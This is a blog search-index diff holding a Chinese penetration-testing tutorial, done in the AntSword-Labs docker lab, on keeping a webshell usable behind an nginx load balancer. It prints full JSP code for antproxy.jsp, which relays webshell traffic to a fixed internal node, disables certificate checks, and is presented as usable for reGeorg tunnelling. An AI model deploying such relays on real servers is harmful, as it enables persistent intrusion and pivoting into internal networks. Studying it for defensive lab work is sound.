@@ -3338,4 +3338,173 @@
     <content><![CDATA[<h1 id="assets"><a href="#assets" class="headerlink" title="assets"></a>assets</h1><p>‍</p>
 ]]></content>
   </entry>
+  <entry>
+    <title>负载均衡下的webshell连接</title>
+    <url>/2024/05/13/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E4%B8%8B%E7%9A%84webshell%E8%BF%9E%E6%8E%A5/</url>
+    <content><![CDATA[<p>摘要</p>
+<span id="more"></span>
+
+<h1 id="负载均衡下的webshell连接"><a href="#负载均衡下的webshell连接" class="headerlink" title="负载均衡下的webshell连接"></a>负载均衡下的webshell连接</h1><p>本文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他！！！</p>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前面试的时候有个面试官问我，如果webshell连接之后不稳定怎么办（有时候会断掉，或是文件上传后大小不匹配），我当时回答是可能存在负载均衡，面试官继续问我如何解决这个问题，当时对这一块了解确实不是很多，后期特意学习了一下。</p>
+<p>负载均衡的概念及分类不是我们本文的讲解重点，大家可以参考下面的链接了解一下。</p>
+<p><a href="https://blog.csdn.net/wanghangzhen/article/details/118554304">https://blog.csdn.net/wanghangzhen/article/details/118554304</a></p>
+<p>‍</p>
+<p><strong>我们重点讨论不能直接访问到跑着具体业务的某个节点的情况，比如说「反向代理方式」。</strong></p>
+<p>反向代理方式其中比较流行的方式是用 nginx 来做负载均衡。我们先简单的介绍一下 nginx 支持的几种策略：</p>
+<table>
+<thead>
+<tr>
+<th><strong>名称</strong></th>
+<th><strong>策略</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>轮询（默认）</strong></td>
+<td>按请求顺序逐一分配</td>
+</tr>
+<tr>
+<td>weight</td>
+<td>根据权重分配</td>
+</tr>
+<tr>
+<td>ip_hash</td>
+<td>根据客户端IP分配</td>
+</tr>
+<tr>
+<td>least_conn</td>
+<td>根据连接数分配</td>
+</tr>
+<tr>
+<td>fair (第三方)</td>
+<td>根据响应时间分配</td>
+</tr>
+<tr>
+<td>url_hash (第三方)</td>
+<td>根据URL分配</td>
+</tr>
+</tbody></table>
+<p>上述的几种策略中 ip_hash和url_hash 这种能固定访问到某个节点的情况和单机的区别不是很大这里我们也做不讨论。所以实验时我会以默认的「轮询」方式来做演示。</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>现在假定在真实生产环境中，存在一个RCE漏洞，可以让我们获取WebShell。</p>
+<h3 id="1-AntSword-Labs项目部署"><a href="#1-AntSword-Labs项目部署" class="headerlink" title="1.AntSword-Labs项目部署"></a>1.AntSword-Labs项目部署</h3><p>通过一级标题1我们已经对负载均衡有了大致的了解，下面我们来正式的搭建实验环境首先我们需要使用Github上的一个开源项目AntSword-Labs（蚁剑实验室）下载连接如下：</p>
+<p><a href="https://github.com/AntSwordProject/AntSword-Labs/tree/master/loadbalance/loadbalance-jsp#/">https://github.com/AntSwordProject/AntSword-Labs/tree/master/loadbalance/loadbalance-jsp#/</a></p>
+<img src="/2024/05/13/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E4%B8%8B%E7%9A%84webshell%E8%BF%9E%E6%8E%A5/image-20240513145102-e2xpqi8.png" class="" title="image">
+
+
+
+<p>下载完项目后，利用docker-compose up -d 启动环境即可。</p>
+<p>为了方便解释，我们只用两个节点，启动之后，看到有 3 个容器（你想象成有 3 台服务器组成）。</p>
+<img src="/2024/05/13/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E4%B8%8B%E7%9A%84webshell%E8%BF%9E%E6%8E%A5/image-20240513145149-wds8pkp.png" class="" title="image">
+
+<p>当前架构如下所示：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">                          ┌─────────────┐</span><br><span class="line">                          │             │</span><br><span class="line">                   ┌──────►  LBSNode 1  │</span><br><span class="line">┌─────────┐        │      │             │</span><br><span class="line">│         │        │      └─────────────┘</span><br><span class="line">│  Nginx  ├────────┤</span><br><span class="line">│         │        │      ┌─────────────┐</span><br><span class="line">└─────────┘        │      │             │</span><br><span class="line">                   └──────►  LBSNode 2  │</span><br><span class="line">                          │             │</span><br><span class="line">                          └─────────────┘</span><br></pre></td></tr></table></figure>
+
+<p>Node1 和 Node2 均是 tomcat 8 ，在内网中开放了 8080 端口，我们在外部是没法直接访问到的。</p>
+<p>我们只能通过 nginx 这台机器访问。nginx 的配置如下：</p>
+<img src="/2024/05/13/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E4%B8%8B%E7%9A%84webshell%E8%BF%9E%E6%8E%A5/image-20240513145552-h68j2fw.png" class="" title="image">​
+
+<p>‍</p>
+<h3 id="2-Webshell连接工具"><a href="#2-Webshell连接工具" class="headerlink" title="2.Webshell连接工具"></a>2.Webshell连接工具</h3><p>我们先按常规操作在蚁剑里添加 Shell。</p>
+<table>
+<thead>
+<tr>
+<th align="center">Shell</th>
+<th align="center">密码</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">​​http:&#x2F;&#x2F;搭建环境的主机IP地址:映射的端口号&#x2F;ant.jsp​</td>
+<td align="center">​<code>ant</code>​</td>
+</tr>
+</tbody></table>
+<img src="/2024/05/13/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E4%B8%8B%E7%9A%84webshell%E8%BF%9E%E6%8E%A5/image-20240513150232-6py0p1g.png" class="" title="image">​
+
+<p>然后连接目标，因为两台节点都在相同的位置存在 ant.jsp，所以连接的时候也没出现什么异常。</p>
+<h2 id="负载均衡环境下WebShell遇到的问题"><a href="#负载均衡环境下WebShell遇到的问题" class="headerlink" title="负载均衡环境下WebShell遇到的问题"></a>负载均衡环境下WebShell遇到的问题</h2><h3 id="1-难点一：如何稳定WebShell连接？"><a href="#1-难点一：如何稳定WebShell连接？" class="headerlink" title="1.难点一：如何稳定WebShell连接？"></a>1.难点一：如何稳定WebShell连接？</h3><p>我们需要在每一台节点的相同位置都上传相同内容的WebShell一旦有一台机器上没有，那么在请求轮到这台机器上的时候，就会出现 404 错误，影响使用。<strong>这就是你出现一会儿正常，一会儿错误的原因。</strong>  </p>
+<p>因为AntSword-Labs环境中，两台节点都在相同的位置存在 ant.jsp，所以连接的时候也没出现什么异常。</p>
+<p>下面我在node1上将ant.jsp删除，效果如下：</p>
+<img src="/2024/05/13/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E4%B8%8B%E7%9A%84webshell%E8%BF%9E%E6%8E%A5/image-20240513151045-s4kysoi.png" class="" title="image">​
+
+<img src="/2024/05/13/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E4%B8%8B%E7%9A%84webshell%E8%BF%9E%E6%8E%A5/image-20240513151113-2apocj2.png" class="" title="image">​
+
+<h3 id="2-难点二：如何固定主机去执行命令？"><a href="#2-难点二：如何固定主机去执行命令？" class="headerlink" title="2.难点二：如何固定主机去执行命令？"></a>2.难点二：如何固定主机去执行命令？</h3><p>我们在执行命令时，无法知道下次的请求交给哪台机器去执行，我们执行 ip a 查看当前执行机器的 ip 时，可以看到一直在飘，因为我们用的是轮询的方式，还算能确定，一旦涉及了权重等其它指标，就让你好好体验一波什么叫飘乎不定。</p>
+<p><strong>小插曲</strong>：环境中可能没有ip addr命令，可以利用apt update&amp;&amp;apt install iproute2进行安装。</p>
+<img src="/2024/05/13/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E4%B8%8B%E7%9A%84webshell%E8%BF%9E%E6%8E%A5/image-20240513152232-8h8q6yw.png" class="" title="image">​
+
+<h3 id="3-难点三：在文件分片上传至两台节点后，由于负载均衡算法的不确定性，如何有效组合这些分片还原完整文件？"><a href="#3-难点三：在文件分片上传至两台节点后，由于负载均衡算法的不确定性，如何有效组合这些分片还原完整文件？" class="headerlink" title="3..难点三：在文件分片上传至两台节点后，由于负载均衡算法的不确定性，如何有效组合这些分片还原完整文件？"></a>3..难点三：在文件分片上传至两台节点后，由于负载均衡算法的不确定性，如何有效组合这些分片还原完整文件？</h3><p><strong>小插曲</strong>：</p>
+<img src="/2024/05/13/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E4%B8%8B%E7%9A%84webshell%E8%BF%9E%E6%8E%A5/image-20240513152456-pza0t94.png" class="" title="image">​
+
+<p>413报错，进入nginx容器修改nginx配置。</p>
+<p>添加最大的大小限制为1024m，即1G，重启生效。</p>
+<img src="/2024/05/13/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E4%B8%8B%E7%9A%84webshell%E8%BF%9E%E6%8E%A5/image-20240513152727-phjq6nx.png" class="" title="image">
+
+<p>继续：</p>
+<img src="/2024/05/13/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E4%B8%8B%E7%9A%84webshell%E8%BF%9E%E6%8E%A5/image-20240513153037-c0vds70.png" class="" title="image">​
+
+<p>问题出现了，上传的原文件大小为23MB，由于 antSword 上传文件时，采用的分片上传方式，把一个文件分成了多次HTTP请求发送给了目标，所以尴尬的事情来了，两台节点上，各一半，而且这一半到底是怎么组合的，取决于 LBS 算法，这可怎么办？</p>
+<h3 id="4-难点四：在目标机器无法出外网的情况下，如何有效深入内网进行渗透工作？"><a href="#4-难点四：在目标机器无法出外网的情况下，如何有效深入内网进行渗透工作？" class="headerlink" title="4.难点四：在目标机器无法出外网的情况下，如何有效深入内网进行渗透工作？"></a>4.难点四：在目标机器无法出外网的情况下，如何有效深入内网进行渗透工作？</h3><p>难点中的重点！！！</p>
+<p>‍</p>
+<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><h3 id="1-思路一-关掉其中一台服务器"><a href="#1-思路一-关掉其中一台服务器" class="headerlink" title="1.思路一 关掉其中一台服务器"></a>1.思路一 关掉其中一台服务器</h3><p>是的，首先想到的第一个方案是关机&#x2F;停服，只保留一台机器，因为健康检查机制的存在，很快其它的节点就会被 nginx 从池子里踢出去，那么妥妥的就能继续了。</p>
+<img src="/2024/05/13/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E4%B8%8B%E7%9A%84webshell%E8%BF%9E%E6%8E%A5/image-20240513153407-6at2lkg.png" class="" title="image">​
+
+<p>确实可以解决问题。</p>
+<img src="/2024/05/13/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E4%B8%8B%E7%9A%84webshell%E8%BF%9E%E6%8E%A5/image-20240513153509-bgqscd6.png" class="" title="image">​
+
+<p>这个方案实在是「<strong>老寿星上吊——活腻了</strong>」，影响业务，还会造成灾难，直接 Pass 不考虑。（实验环境下，权限够的时候是可以测试可行性的）。</p>
+<p>综合评价<strong>：真实环境下千万不要尝试！！！！</strong></p>
+<p>‍</p>
+<h3 id="2-思路二：在程序执行前先判断要不要执行"><a href="#2-思路二：在程序执行前先判断要不要执行" class="headerlink" title="2.思路二：在程序执行前先判断要不要执行"></a>2.思路二：在程序执行前先判断要不要执行</h3><p>既然无法预测下一次是哪台机器去执行，那我们的shell在执行Payload之前，先判断一下要不要执行不就可以了。</p>
+<p>首次按创建一个脚本demo.sh，该脚本是获取我们的后端其中一台服务器的地址，匹配到这台服务器的地址才进行程序的执行，匹配到另一台服务器则不进行程序的执行。</p>
+<img src="/2024/05/13/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E4%B8%8B%E7%9A%84webshell%E8%BF%9E%E6%8E%A5/image-20240513161644-sixl5up.png" class="" title="image">​
+
+<img src="/2024/05/13/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E4%B8%8B%E7%9A%84webshell%E8%BF%9E%E6%8E%A5/image-20240513161615-f1o46dq.png" class="" title="image">​
+
+<p>这样一来，确实能够保证执行的命令是在我们想要的机器上了，可是这样执行命令，没有一丝美感，另外，大文件上传、HTTP隧道这些问题也没有解决。</p>
+<p>综合评价:<strong>该方案勉强能用，仅适合在执行命令的时候用，不够优雅。</strong></p>
+<p>‍</p>
+<h3 id="3-思路三：在Web层做一次HTTP流量的转发-重点"><a href="#3-思路三：在Web层做一次HTTP流量的转发-重点" class="headerlink" title="3.思路三：在Web层做一次HTTP流量的转发(重点)"></a>3.思路三：在Web层做一次HTTP流量的转发(重点)</h3><p>我们用 AntSword 没法直接访问 LBSNode1 内网IP(172.23.0.2)的 8080 端口，但是有人能访问呀，除了 nginx 能访问之外，LBSNode2 这台机器也是可以访问 Node1 这台机器的 8080 端口的。</p>
+<p>参考下面的场景：</p>
+<img src="/2024/05/13/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E4%B8%8B%E7%9A%84webshell%E8%BF%9E%E6%8E%A5/image-20240513161843-ytpijkw.png" class="" title="image">​
+
+<p>我们一步一步来看这个图，我们的目的是：<strong>所有的数据包都能发给「LBSNode 1」这台机器。</strong></p>
+<p>首先是 第 1 步，我们请求 &#x2F;antproxy.jsp，这个请求发给 nginx</p>
+<p>nginx 接到数据包之后，会有两种情况：</p>
+<p>我们先看黑色线，第 2 步把请求传递给了目标机器，请求了 Node1 机器上的 &#x2F;antproxy.jsp，接着 第 3 步，&#x2F;antproxy.jsp 把请求重组之后，传给了 Node1 机器上的 &#x2F;ant.jsp，成功执行。</p>
+<p>再来看红色线，第 2 步把请求传给了 Node2 机器, 接着第 3 步，Node2 机器上面的 &#x2F;antproxy.jsp 把请求重组之后，传给了 Node1 的 &#x2F;ant.jsp，成功执行。</p>
+<p>‍</p>
+<p><strong>1.</strong> <strong>创建 antproxy.jsp 脚本</strong></p>
+<p><strong>修改转发地址</strong>，转向<strong>目标 Node</strong> 的 内网IP的 <strong>目标脚本</strong> 访问地址。</p>
+<p><strong>注意：不仅仅是 WebShell 哟，还可以改成 reGeorg 等脚本的访问地址。</strong></p>
+<p>我们将 target 指向了 LBSNode1 的 ant.jsp</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.net.ssl.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.ByteArrayOutputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.DataInputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.OutputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.net.HttpURLConnection&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.net.URL&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.security.KeyManagementException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.security.NoSuchAlgorithmException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.security.cert.CertificateException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.security.cert.X509Certificate&quot;</span> %&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">ignoreSsl</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">HostnameVerifier</span> <span class="variable">hv</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HostnameVerifier</span>() &#123;</span><br><span class="line">            <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">verify</span><span class="params">(String urlHostName, SSLSession session)</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        trustAllHttpsCertificates();</span><br><span class="line">        HttpsURLConnection.setDefaultHostnameVerifier(hv);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">trustAllHttpsCertificates</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        TrustManager[] trustAllCerts = <span class="keyword">new</span> <span class="title class_">TrustManager</span>[] &#123; <span class="keyword">new</span> <span class="title class_">X509TrustManager</span>() &#123;</span><br><span class="line">            <span class="keyword">public</span> X509Certificate[] getAcceptedIssuers() &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">checkClientTrusted</span><span class="params">(X509Certificate[] arg0, String arg1)</span> <span class="keyword">throws</span> CertificateException &#123;</span><br><span class="line">                <span class="comment">// Not implemented</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">checkServerTrusted</span><span class="params">(X509Certificate[] arg0, String arg1)</span> <span class="keyword">throws</span> CertificateException &#123;</span><br><span class="line">                <span class="comment">// Not implemented</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; &#125;;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">SSLContext</span> <span class="variable">sc</span> <span class="operator">=</span> SSLContext.getInstance(<span class="string">&quot;TLS&quot;</span>);</span><br><span class="line">            sc.init(<span class="literal">null</span>, trustAllCerts, <span class="keyword">new</span> <span class="title class_">java</span>.security.SecureRandom());</span><br><span class="line">            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (KeyManagementException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">        <span class="type">String</span> <span class="variable">target</span> <span class="operator">=</span> <span class="string">&quot;http://172.29.0.3:8080/ant.jsp&quot;</span>;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(target);</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;https&quot;</span>.equalsIgnoreCase(url.getProtocol())) &#123;</span><br><span class="line">            ignoreSsl();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">HttpURLConnection</span> <span class="variable">conn</span> <span class="operator">=</span> (HttpURLConnection)url.openConnection();</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        conn.setRequestMethod(request.getMethod());</span><br><span class="line">        conn.setConnectTimeout(<span class="number">30000</span>);</span><br><span class="line">        conn.setDoOutput(<span class="literal">true</span>);</span><br><span class="line">        conn.setDoInput(<span class="literal">true</span>);</span><br><span class="line">        conn.setInstanceFollowRedirects(<span class="literal">false</span>);</span><br><span class="line">        conn.connect();</span><br><span class="line">        ByteArrayOutputStream baos=<span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">OutputStream</span> <span class="variable">out2</span> <span class="operator">=</span> conn.getOutputStream();</span><br><span class="line">        DataInputStream in=<span class="keyword">new</span> <span class="title class_">DataInputStream</span>(request.getInputStream());</span><br><span class="line">        <span class="type">byte</span>[] buf = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ((len = in.read(buf)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            baos.write(buf, <span class="number">0</span>, len);</span><br><span class="line">        &#125;</span><br><span class="line">        baos.flush();</span><br><span class="line">        baos.writeTo(out2);</span><br><span class="line">        baos.close();</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> conn.getInputStream();</span><br><span class="line">        OutputStream out3=response.getOutputStream();</span><br><span class="line">        <span class="type">int</span> <span class="variable">len2</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ((len2 = inputStream.read(buf)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            out3.write(buf, <span class="number">0</span>, len2);</span><br><span class="line">        &#125;</span><br><span class="line">        out3.flush();</span><br><span class="line">        out3.close();</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>注意: </p>
+<p><strong>a) 不要使用上传功能</strong>，上传功能会分片上传，导致分散在不同 Node 上。</p>
+<p><strong>b)</strong> 要保证每一台 Node 上都有相同路径的 antproxy.jsp, 所以我疯狂保存了很多次，保证每一台都上传了脚本</p>
+<img src="/2024/05/13/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E4%B8%8B%E7%9A%84webshell%E8%BF%9E%E6%8E%A5/image-20240513162410-wemkej7.png" class="" title="image">​
+
+<p><strong>2. 修改 Shell 配置, 将 URL 部分填写为 antproxy.jsp 的地址，其它配置不变</strong></p>
+<img src="/2024/05/13/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E4%B8%8B%E7%9A%84webshell%E8%BF%9E%E6%8E%A5/image-20240513162459-1qql9id.png" class="" title="image">​​
+
+<p><strong>3. 测试执行命令, 查看 IP</strong></p>
+<img src="/2024/05/13/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E4%B8%8B%E7%9A%84webshell%E8%BF%9E%E6%8E%A5/image-20240513162642-uapx1ze.png" class="" title="image">​
+
+<p>大文件上传问题也得以解决。</p>
+<img src="/2024/05/13/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E4%B8%8B%E7%9A%84webshell%E8%BF%9E%E6%8E%A5/image-20240513163032-pjq4qef.png" class="" title="image">​
+
+<p><strong>优点：</strong></p>
+<ul>
+<li>低权限就可以完成，如果权限高的话，还可以通过端口层面直接转发，不过这跟 Plan A 的关服务就没啥区别了</li>
+<li>流量上，只影响访问 WebShell 的请求，其它的正常业务请求不会影响。</li>
+<li>适配更多工具</li>
+</ul>
+<p><strong>缺点：</strong></p>
+<ul>
+<li>该方案需要「目标 Node」和「其它 Node」 之间内网互通，如果不互通就凉了（敲黑板：加固方案快记下来）</li>
+</ul>
+<p>参考链接：<a href="https://mp.weixin.qq.com/s/4Bmz_fuu0yrLMK1oBKKtRA#/">https://mp.weixin.qq.com/s/4Bmz_fuu0yrLMK1oBKKtRA#/</a><br><a href="https://blog.csdn.net/m0_74834253/article/details/135898736">https://blog.csdn.net/m0_74834253/article/details/135898736</a></p>
+]]></content>
+      <categories>
+        <category>渗透</category>
+      </categories>
+  </entry>
 </search>
